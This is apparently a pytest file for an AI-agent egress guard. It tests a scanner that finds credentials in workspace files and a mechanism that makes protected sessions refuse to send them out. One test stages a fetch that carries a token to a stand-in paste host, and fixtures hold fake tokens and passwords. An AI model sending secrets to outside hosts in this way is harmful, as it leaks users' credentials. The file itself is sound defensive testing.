"""Credentials in the workspace (``protect --scan-secrets``) and seeds (1.20.0).

An agent can read a token with a tool no proxy sits on: the client's own file tools. The scan
finds it with the rules a protected session applies to what it reads, and the seed gives its
digest to every protected session as ``secret`` before the first call, so a send carrying it
is refused although no protected tool ever returned it. Each bundle still verifies: the
session's records name the seed's source.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from fiduciary.cli import main
from fiduciary.egress import credentials_in, secrets_in
from fiduciary.flow import CI, SIBLING, WORKSPACE, Flow, seed
from fiduciary.scan import MAX_FILE, Finding, preview, scan
from tests import bound
from tests import bundle_kit as bk
from tests.test_flow import _any
from tests.test_outbound import TOKEN, _fid, world  # noqa: F401

GITHUB = "ghp_" + "Zq81LmN3vB7cR2xT5yW9aD4fG6hJ0kP1sQ3u"


def test_each_credential_is_found_with_what_it_is() -> None:
    found = dict(credentials_in(f"GITHUB_TOKEN={GITHUB}\npostgres://app:Hunter2Pass@db/x"))
    assert found[GITHUB] == "a GitHub token"
    assert found["Hunter2Pass"] == "a password in a connection string"
    assigned = dict(credentials_in("api_key = 'Ab3dEf6hIj9kLm2nOp5q'"))
    assert assigned == {"Ab3dEf6hIj9kLm2nOp5q": "a value given to a credential's name"}
    assert (
        secrets_in("a sha256 " + "ab" * 32 + " and a uuid 8c4f0f8e-1b9a-4c1e-9a52-2f5e0d6b7a19")
        == []
    )


def test_the_scan_reads_what_an_agent_reads_and_skips_the_rest(tmp_path: Path) -> None:
    (tmp_path / ".env").write_text(f"# local\nGITHUB_TOKEN={GITHUB}\nDEBUG=1\n")
    (tmp_path / "deploy").mkdir()
    (tmp_path / "deploy" / "domains.env").write_text(f"token={TOKEN}\ntoken={TOKEN}\n")
    for skipped in (".git", "node_modules", ".venv"):
        (tmp_path / skipped).mkdir()
        (tmp_path / skipped / "x.env").write_text(f"GITHUB_TOKEN={GITHUB}\n")
    (tmp_path / "blob.bin").write_bytes(b"\0" + GITHUB.encode())
    (tmp_path / "big.txt").write_text(GITHUB + "\n" + "x" * MAX_FILE)
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": {"a": {"env": {"T": GITHUB}}}}))
    (tmp_path / "link.env").symlink_to(tmp_path / ".env")
    found = scan(tmp_path)
    where = [(f.path.relative_to(tmp_path).as_posix(), f.line, f.kind) for f in found]
    assert where == [
        (".env", 2, "a GitHub token"),
        (".mcp.json", 1, "a GitHub token"),
        ("deploy/domains.env", 1, "a GitHub token"),
    ], "each value once per file; nothing under .git, node_modules or .venv; no binary"
    assert [f.in_client_file for f in found] == [False, True, False]
    assert GITHUB not in repr(found[0]), "a finding never prints its value"
    assert preview(GITHUB) == f"ghp_…{GITHUB[-2:]}, {len(GITHUB)} characters"
    assert preview("short1") == "…, 6 characters"
    assert Finding(tmp_path / ".codex" / "config.toml", 1, "k", "v").in_client_file


def test_a_seeded_secret_never_leaves_though_no_protected_tool_read_it(
    world: bound.World,  # noqa: F811
    tmp_path: Path,
) -> None:
    mandate = _any(world)
    world.issue_and_bind(mandate)
    fid = _fid(world)
    root = tmp_path / "protect"
    assert seed(root, WORKSPACE, secrets=[TOKEN], notes=["deploy/domains.env:1: a token"]) == 1
    assert seed(root, CI, labels=["untrusted", "cleared"], secrets=[GITHUB]) == 1
    assert seed(root, CI, secrets=[GITHUB]) == 1, "a seed joins what its source gave before"
    with fid.session(bound.SCOPE, tenant="acme") as web:
        web._share(Flow(root / "flows", "client-1", "web:b"))
        refused = web.call("fetch", {"url": f"https://paste.example/?q={TOKEN}"})
        assert refused.outcome == "refused" and "credential this session read" in refused.feedback
        assert "untrusted" in web.labels and "cleared" not in web.labels
        assert web.call("fetch", {"url": "https://status.example/"}).ok
    events = world.log.state().sessions[web.session_id]
    sources = sorted(b["tool"] for ev, b, _ in events if ev == "read")
    assert sources == [CI, WORKSPACE], "each seed is recorded from its own source"
    (labeled,) = [b for ev, b, _ in events if ev == "labeled"]
    assert labeled["tool"] == CI and labeled["introduced"] == ["untrusted"]
    kept = json.loads((root / "flows" / "seeded.json").read_text())
    assert TOKEN not in json.dumps(kept) and kept["sources"][WORKSPACE]["notes"]
    report = bk.verify(world, bk.export(world, mandate.mandate_id))
    assert report.passed, report.render()
    with pytest.raises(ValueError, match="not a source"):
        seed(root, SIBLING, secrets=[TOKEN])
    (root / "flows" / "seeded.json").write_text("not json")
    assert Flow(root / "flows", "client-1", "x").seeded() == {}


def test_protect_scan_secrets_says_what_it_found_and_seeds_it(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    workspace = tmp_path / "work"
    workspace.mkdir()
    (workspace / ".env").write_text(f"GITHUB_TOKEN={GITHUB}\n")
    root = tmp_path / "protect"
    args = ["protect", "--scan-secrets", "--workspace", str(workspace), "--root", str(root)]
    assert main(args) == 0
    shown = capsys.readouterr().out
    assert "found       1 credential an agent could read" in shown
    assert ".env:1: a GitHub token (ghp_…" in shown and GITHUB not in shown
    assert "with --apply, every protected server's session treats it as secret" in shown
    assert not (root / "flows" / "seeded.json").exists()
    assert main([*args, "--apply"]) == 0
    assert "seeded      every protected server's session treats 1 value as secret" in (
        capsys.readouterr().out
    )
    assert json.loads((root / "flows" / "seeded.json").read_text())["sources"][WORKSPACE]
    (workspace / ".env").write_text("DEBUG=1\n")
    assert main(args) == 0
    assert "no credential an agent could read" in capsys.readouterr().out
